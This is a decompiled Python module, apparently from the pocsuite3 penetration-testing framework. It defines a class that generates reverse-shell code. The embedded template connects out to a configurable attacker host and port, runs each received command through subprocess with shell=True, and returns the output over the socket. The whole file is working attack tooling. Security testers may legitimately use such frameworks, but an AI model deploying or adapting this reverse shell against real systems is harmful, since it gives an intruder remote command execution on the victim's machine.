# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /Users/boyhack/programs/pocsuite3/pocsuite3/shellcodes/python.py
# Compiled at: 2019-03-15 03:35:12
# Size of source mod 2**32: 1903 bytes
from .base import ShellCode

class PythonShellCode(ShellCode):
    __doc__ = '\n        Class with shellcodes for python language\n    '

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port)

    def get_python_code(self, bad_chars):
        """
            Function to get python shellcode
        """
        if not (self.connect_back_ip and self.connect_back_port):
            print('Settings for connect back listener must be defined')
            return False
        python_code = "\n        #!/usr/bin/python\n        import socket,subprocess\n        HOST = '{{LOCALHOST}}'    # The remote host\n        PORT = {{LOCALPORT}}      # The same port as used by the server\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        # connect to attacker machine\n        s.connect((HOST, PORT))\n        # send we are connected\n        s.send('[*] Connection Established!')\n        # start loop\n        while 1:\n            # recieve shell command\n            data = s.recv(1024)\n            print data\n            # if its quit, then break out and close socket\n            if data == 'quit' or data == 'q':\n                break\n            # do shell command\n            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            # read output\n            stdout_value = proc.stdout.read() + proc.stderr.read()\n            # send output to attacker\n            s.send(stdout_value)\n        # close socket\n        s.close()\n        "
        python_code = self.format_shellcode(python_code)
        return python_code

    def get_shellcode(self, inline=False):
        shell = self.get_python_code(self.bad_chars)
        if inline:
            shell = self.make_inline(shell)
        return shell